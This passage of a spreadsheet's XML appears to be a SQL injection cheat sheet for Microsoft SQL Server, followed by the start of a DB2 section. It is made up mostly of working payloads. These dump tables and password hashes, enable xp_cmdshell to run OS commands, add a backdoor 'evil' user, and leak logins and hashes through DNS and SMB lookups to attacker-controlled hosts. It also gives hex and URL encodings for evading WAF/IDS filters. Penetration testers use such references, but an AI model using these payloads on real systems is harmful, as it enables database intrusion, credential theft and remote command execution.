        </table:table-row>
        <table:table-row table:style-name="ro17">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Retrieving Multiple Tables/Columns at once</text:p>
            <text:p> Following 3 queries will create a temporary table/column, insert all user-defined tables into it, then</text:p>
            <text:p> Dump content and delete the table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>    Create Temp Table/Column and Insert Data:</text:p>
            <text:p>AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name&gt;@xy SELECT @xy AS xy INTO TMP_DB END;</text:p>
            <text:p/>
            <text:p>    Dump Content:</text:p>
            <text:p>AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);</text:p>
            <text:p/>
            <text:p>    Delete Table:</text:p>
            <text:p>AND 1=0; DROP TABLE TMP_DB;</text:p>
            <text:p/>
            <text:p>    Easier method in &gt;= 2005</text:p>
            <text:p>SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('')</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro29">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Retrieving Multiple Tables/Columns at once, alternate</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1) Read tables Injection for string,</text:p>
            <text:p>';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</text:p>
            <text:p/>
            <text:p>2) Read from new temp table,</text:p>
            <text:p>Step 1</text:p>
            <text:p>' OR 1=CAST((SELECT TOP 1 SUBSTRING(rd,1,360) FROM TMP_SYS_TMP) AS Int)--</text:p>
            <text:p>Step 2</text:p>
            <text:p>' OR 1=CAST((SELECT TOP 1 SUBSTRING(rd,353,360) FROM TMP_SYS_TMP) AS Int)--</text:p>
            <text:p>Step n..</text:p>
            <text:p>Add 353 of your previous SQL to read more</text:p>
            <text:p/>
            <text:p>' OR 1=CAST((SELECT TOP 1 SUBSTRING(rd,n*353,360) FROM TMP_SYS_TMP) AS Int)--</text:p>
            <text:p/>
            <text:p>3) Drop table</text:p>
            <text:p>';DROP TABLE TMP_SYS_TMP--</text:p>
            <text:p>4) Change query and first injection query and get more data …</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Select Nth Row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC — gets 9th row</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Select Nth Car</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT substring(‘abcd’, 3, 1) — returns c</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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0×41)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4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Casting</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT CAST(’1′ as int);</text:p>
            <text:p>SELECT CAST(1 as char)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String Concat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT ‘A’ + ‘B’ – returns AB</text:p>
            <text:p>SELECT CONCAT('a','a','a'); (SQL SERVER 2012)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IF Statement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IF (1=1) SELECT 1 ELSE SELECT 2 — returns 1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CASE statement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END — returns 1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Avoiding quotes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT char(65)+char(66) — returns AB</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro7">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Time Delay</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>WAITFOR DELAY ’0:0:5′ — pause for 5 seconds</text:p>
            <text:p>WAITFOR TIME 'time_to_execute'; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro25">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Make DNS Requests (out of band) (priv)</text:p>
            <text:p>– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.</text:p>
            <text:p>– Also check out theDNS tunnel feature of sqlninja</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’); — nonpriv, works on 2000</text:p>
            <text:p>declare @host varchar(800); select @host = name + ‘-’ +Master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + </text:p>
            <text:p>‘c$boot.ini”’); — priv, works on 2005</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro30">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Out of band (think about having server contact your own DNS or SMB share (responder!))</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">Xp_dirtree has three parameters: dir, depth, file</text:span></text:p>
            <text:p>xp_dirtree <text:a xlink:href="smb://host/share" xlink:type="simple">\\host\share</text:a>,0,1</text:p>
            <text:p/>
            <text:p>Makes DNS resolution request to {INJECT}.yourhost.com. INJECTION should be a sql query of data you want received.</text:p>
            <text:p>?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECTION})+'.yourhost.com';'sa';'pwd', 'SELECT 1')</text:p>
            <text:p>?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECTION})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command Exec</text:p>
            <text:p> &gt;= 2005, xp_cmdshell disabled, can be enabled with the below</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:</text:p>
            <text:p>EXEC sp_configure ‘show advanced options’, 1; — priv</text:p>
            <text:p>RECONFIGURE; — priv</text:p>
            <text:p><text:span text:style-name="T3">EXEC master..xp_cmdshell 'dir'</text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC master.dbo.xp_cmdshell 'cmd'; </text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC master.dbo.xp_cmdshell ‘net user evil 1234 /add’ ;--</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro28">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Enable xp_cmdshell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">EXEC sp_configure 'show advanced options', 1</text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC sp_configure reconfigure</text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC sp_configure 'xp_cmdshell', 1</text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC sp_configure reconfigure</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">If xp_cmdshell has been disabled/removed with sp_dropexetendedproc, inject the following</text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC sp_addextendedproc ‘xp_anyname’, ‘xp_log70.dll’;--xp_log70.dll provides the xp_cmdshell functionality</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro31">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>If xp_log70.dll has been moved or deleted, inject the following code</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS</text:p>
            <text:p>DECLARE @result int, @OLEResult int, @RunResult int</text:p>
            <text:p>DECLARE @ShellID int</text:p>
            <text:p>EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT</text:p>
            <text:p>IF @OLEResult &lt;&gt; 0 SELECT @result = @OLEResult</text:p>
            <text:p>IF @OLEResult &lt;&gt; 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)</text:p>
            <text:p>EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait</text:p>
            <text:p>IF @OLEResult &lt;&gt; 0 SELECT @result = @OLEResult</text:p>
            <text:p>IF @OLEResult &lt;&gt; 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)</text:p>
            <text:p>EXECUTE @OLEResult = sp_OADestroy @ShellID</text:p>
            <text:p>Return @result</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Add new procedure virtually, you can exec whatever you want</text:p>
            <text:p> &gt;= 2000, need to run the queries above</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll' </text:p>
            <text:p>Exec xp_webserver</text:p>
            <text:p/>
            <text:p>DECLARE @execmd INT</text:p>
            <text:p>EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT</text:p>
            <text:p>EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro32">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Cmd exec registry functions</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_regread </text:p>
            <text:p>xp_regaddmultistring</text:p>
            <text:p>xp_regdeletekey</text:p>
            <text:p>xp_regdeletevalue</text:p>
            <text:p>xp_regenumkeys</text:p>
            <text:p>xp_regenumvalues</text:p>
            <text:p>xp_regremovemultistring</text:p>
            <text:p>xp_regwrite </text:p>
            <text:p>exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'  --find shares that allow null sessions</text:p>
            <text:p>Exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Managing services</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_servicecontrol</text:p>
            <text:p>Exec master..xp_servicecontrol ‘start’,’schedule’</text:p>
            <text:p>Exec master..xp_servicecontrol ‘start’,’server’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Medias – reveals the available drives on the machine</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_availablemedia</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ODBC Resources</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_enumdsn</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Login mode</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_loginconfig</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Creating Cab files –compressed archive of files on the server</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_makecab</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Domain enumeration –enumerates domains that the server can access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_ntsec_enumdomains</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Process Killing (need PID)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_terminate_process</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Allows a directory tree to be obtained</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_dirtree</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro33">
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>Checks to see if xp_cmdshell is loaded, if it is, it checks if it is active and then proceeds to run the 'dir' command and inserts the results into TMP_DB: </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'&lt;br&gt;&lt;/font&gt;&lt;font color="black"&gt;'%2Bdir,'&lt;dir&gt;','&lt;/font&gt;&lt;font color="orange"&gt;') FROM %23Data WHERE dir&gt;@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB-- </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Local file access</text:p>
            <text:p> Also think about bulk insert from SMB or other network share </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CREATE TABLE mydata (line varchar(8000));</text:p>
            <text:p>BULK INSERT mydata FROM ‘c:boot.ini’;</text:p>
            <text:p><text:span text:style-name="T3">BULK INSERT</text:span> foo FROM '\\YOURIPADDRESS\C$\x.txt'</text:p>
            <text:p>DROP TABLE mydata;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Hostname, IP Address</text:p>
            <text:p>  SERVERPROPERTY() MSSQL &gt;= 2005</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT HOST_NAME()</text:p>
            <text:p>@@SERVERNAME</text:p>
            <text:p>SERVERPROPERTY()</text:p>
            <text:p>SELECT SERVERPROPERTY(‘productversion’),SERVERPROPERTY(‘productlevel’),SERVERPROPERTY(‘edition’);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Create Users (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>EXEC <text:a xlink:href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx" xlink:type="simple">sp_addlogin</text:a> ‘user’, ‘pass’; — priv</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Drop users (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>EXEC <text:a xlink:href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx" xlink:type="simple">sp_droplogin</text:a> ‘user’; — priv</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Make user DBA (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>EXEC <text:a xlink:href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx" xlink:type="simple">master.dbo.sp_addsrvrolemember</text:a> ‘user’, ‘sysadmin; — priv</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Location of DB files</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>EXEC sp_helpdb master; –location of master.mdf</text:p>
            <text:p>EXEC sp_helpdb pubs; –location of pubs.mdf</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Default/System Databases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>northwind</text:p>
            <text:p>model</text:p>
            <text:p>msdb</text:p>
            <text:p>pubs — not on sql server 2005</text:p>
            <text:p>Tempdb</text:p>
            <text:p>information_schema – available MSSQL 2000 and higher</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Some special tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>master..sysmessages -Error Messages </text:p>
            <text:p>master..sysservers -Linked Servers </text:p>
            <text:p>masters..sysxlogins  -SQL Server 2000: Password</text:p>
            <text:p>Sys.sql_logins -SQL Server 2005 : Password</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro20">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Information_schema tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>syscolumns</text:p>
            <text:p>Sysindexkeys</text:p>
            <text:p>Syscomments</text:p>
            <text:p>Sysmembers</text:p>
            <text:p>Syscontraints</text:p>
            <text:p>Sysobjects</text:p>
            <text:p>Sysdepends</text:p>
            <text:p>Syspermissions</text:p>
            <text:p>Sysfilegroups</text:p>
            <text:p>Sysprotects</text:p>
            <text:p>Sysfiles</text:p>
            <text:p>Sysreferences</text:p>
            <text:p>Sysforeignkeys</text:p>
            <text:p>Systypes</text:p>
            <text:p>Sysfulltextcatalogs</text:p>
            <text:p>Sysusers</text:p>
            <text:p>Sysindexes</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="8">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Write text file to UNC or internal path</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>sp_makewebtask</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="4">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3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>You can encode your query in hex to "obfuscate" your attack. </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);-- </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Avoiding the use of quotations</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro34">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Whitespaces</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>01 Start of Heading</text:p>
            <text:p>02 Start of Text</text:p>
            <text:p>03 End of Text</text:p>
            <text:p>04 End of Transmission</text:p>
            <text:p>05 Enquiry</text:p>
            <text:p>06 Acknowledge</text:p>
            <text:p>07 Bell</text:p>
            <text:p>08 Backspace</text:p>
            <text:p>09 Horizontal Tab</text:p>
            <text:p>0A New Line</text:p>
            <text:p>0B Vertical Tab</text:p>
            <text:p>0C New Page</text:p>
            <text:p>0D Carriage Return</text:p>
            <text:p>0E Shift Out</text:p>
            <text:p>0F Shift In</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro35">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Whitespaces continued</text:p>
            <text:p> The percentage signs in between keywords is only possible on ASP(x) web applications. </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">10 Data Link Escape</text:span></text:p>
            <text:p><text:span text:style-name="T3">11 Device Control 1</text:span></text:p>
            <text:p><text:span text:style-name="T3">12 Device Control 2</text:span></text:p>
            <text:p><text:span text:style-name="T3">13 Device Control 3</text:span></text:p>
            <text:p><text:span text:style-name="T3">14 Device Control 4</text:span></text:p>
            <text:p><text:span text:style-name="T3">15 Negative Acknowledge</text:span></text:p>
            <text:p><text:span text:style-name="T3">16 Synchronous Idle</text:span></text:p>
            <text:p><text:span text:style-name="T3">17 End of Transmission Block</text:span></text:p>
            <text:p><text:span text:style-name="T3">18 Cancel</text:span></text:p>
            <text:p><text:span text:style-name="T3">19 End of Medium</text:span></text:p>
            <text:p><text:span text:style-name="T3">1A Substitute</text:span></text:p>
            <text:p><text:span text:style-name="T3">1B Escape</text:span></text:p>
            <text:p><text:span text:style-name="T3">1C File Separator</text:span></text:p>
            <text:p><text:span text:style-name="T3">1D Group Separator</text:span></text:p>
            <text:p><text:span text:style-name="T3">1E Record Separator</text:span></text:p>
            <text:p><text:span text:style-name="T3">1F Unit Separator</text:span></text:p>
            <text:p><text:span text:style-name="T3">20 Space</text:span></text:p>
            <text:p><text:span text:style-name="T3">25 %</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Avoid the use of spaces</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>22 "</text:p>
            <text:p>28 (</text:p>
            <text:p>29 )</text:p>
            <text:p>5B [</text:p>
            <text:p>5D ]</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Allowed Intermediary Characters after AND/OR</text:p>
            <text:p>  The backslash does not seem to work with MSSQL 2000. </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>01 - 20 Range</text:p>
            <text:p>21 !</text:p>
            <text:p>2B +</text:p>
            <text:p>2D -</text:p>
            <text:p>2E .</text:p>
            <text:p>5C \</text:p>
            <text:p>7E ~</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Encoding your injection can sometimes be useful for WAF/IDS evasion. </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>URL Encoding SELECT %74able_%6eame FROM information_schema.tables;</text:p>
            <text:p>Double URL Encoding SELECT %2574able_%256eame FROM information_schema.tables;</text:p>
            <text:p>Unicode Encoding SELECT %u0074able_%u6eame FROM information_schema.tables;</text:p>
            <text:p>Invalid Hex Encoding (ASP) SELECT %tab%le_%na%me FROM information_schema.tables;</text:p>
            <text:p>Hex Encoding ' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--</text:p>
            <text:p>HTML Entities (Needs to be verified) %26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Hashing</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Passwords begin with 0x0100, the first for bytes following the 0x are a constant; the next eight bytes are the hash salt and the remaining 80 bytes are two hashes, the first 40 bytes are a case-sensitive hash of the password, while the second 40 bytes are the uppercase version.</text:p>
            <text:p>0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <table:table table:name="DB2" table:style-name="ta1">
        <table:table-column table:style-name="co8" table:default-cell-style-name="ce4"/>
        <table:table-column table:style-name="co9" table:default-cell-style-name="ce4"/>
        <table:table-row table:style-name="ro36">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Version*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select service_level from table(sysproc.env_get_inst_info()) as instanceinfo</text:p>
            <text:p><text:span text:style-name="T2">Select getvariable(‘sysibm.version’) from sysibm.sysdummy1 — (v8+)</text:span></text:p>
            <text:p><text:span text:style-name="T2">Select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo</text:span></text:p>
            <text:p><text:span text:style-name="T2">Select service_level,bld_level from sysibmadm.env_inst_info</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Comments</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select blah from foo — comment like this (double dash)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro37">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current User</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select user from sysibm.sysdummy1</text:p>
            <text:p><text:span text:style-name="T2">Select session_user from sysibm.sysdummy1</text:span></text:p>
            <text:p><text:span text:style-name="T2">Select system_user from sysibm.sysdummy1</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Users*</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DB2 uses OS accounts. Those with DB2 access can be retrieved with:</text:p>
            <text:p><text:span text:style-name="T2">Select distinct(authid) from sysibmadm.privileges — priv required</text:span></text:p>
            <text:p><text:span text:style-name="T2">Select grantee from syscat.dbauth — incomplete results</text:span></text:p>
            <text:p><text:span text:style-name="T2">Select distinct(definer) from syscat.schemata — more accurate</text:span></text:p>
            <text:p><text:span text:style-name="T2">Select distinct(grantee) from sysibm.systabauth — same as previous</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Password Hashes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>N/A (OS User Accounts)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro37">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Privileges</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select * from syscat.tabauth — shows priv on tables</text:p>
            <text:p><text:span text:style-name="T2">Select * from syscat.tabauth where grantee = current user — shows privs for current user</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro38">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List DBA Accounts*</text:p>
          </table:table-cell>
